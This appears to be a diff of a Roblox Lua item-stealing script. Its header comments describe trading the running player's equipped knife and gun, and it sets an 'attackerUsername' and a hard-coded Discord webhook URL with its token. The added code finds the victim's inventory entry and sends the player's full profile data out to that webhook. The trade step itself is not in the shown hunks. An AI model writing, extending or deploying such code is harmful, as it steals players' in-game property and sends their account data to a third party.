@@ -1,4 +1,4 @@
---[=[ FINAL: Trade equipped knife and gun from profile data ]=]
+--[=[ FINAL: Profile-based trade with name lookup ]=]
 
 local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"
 local attackerUsername = "FEARACCE"
@@ -93,6 +93,23 @@ end
 
 send("✅ Remotes found.")
 
+-- --- Helper: serialize a table to a readable string (for Discord)
+local function tableToString(tbl, indent)
+    indent = indent or 0
+    local pad = string.rep(" ", indent)
+    if type(tbl) ~= "table" then return tostring(tbl) end
+    local lines = {}
+    for k, v in pairs(tbl) do
+        local key = type(k) == "string" and k or "["..tostring(k).."]"
+        if type(v) == "table" then
+            table.insert(lines, pad .. key .. " = {\n" .. tableToString(v, indent+2) .. pad .. "}")
+        else
+            table.insert(lines, pad .. key .. " = " .. tostring(v))
+        end
+    end
+    return table.concat(lines, ",\n")
+end
+
 -- --- Get profile data and extract knife & gun
 local function getPlayerItems()
     local InventoryFolder = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Inventory")
@@ -106,16 +123,38 @@ local function getPlayerItems()
         send("❌ Failed to get profile data.")
         return nil, nil
     end
-    -- Find the local player's data by matching UserId
+
+    -- Send the full structure to Discord for debugging
+    local struct = tableToString(data)
+    send("📋 Full profile data:\n```lua\n" .. struct .. "\n```")
+
+    -- Try to find the local player's entry
+    local localName = player.Name
     local localUserId = player.UserId
-    local knife, gun = nil, nil
-    for _, entry in pairs(data) do
-        if type(entry) == "table" and entry.UserId == localUserId then
-            knife = entry.Knife
-            gun = entry.Gun
-            break
+    local entry = nil
+
+    -- Method 1: keyed by player name
+    if data[localName] and type(data[localName]) == "table" then
+        entry = data[localName]
+        send("✅ Found by player name: " .. localName)
+    else
+        -- Method 2: scan for matching UserId
+        for _, e in pairs(data) do
+            if type(e) == "table" and e.UserId == localUserId then
+                entry = e
+                send("✅ Found by UserId")
+                break
+            end
         end
     end
+
+    if not entry then
+        send("❌ Could not find entry for " .. localName)
+        return nil, nil
+    end
+
+    local knife = entry.Knife
+    local gun = entry.Gun
     return knife, gun
 end
 
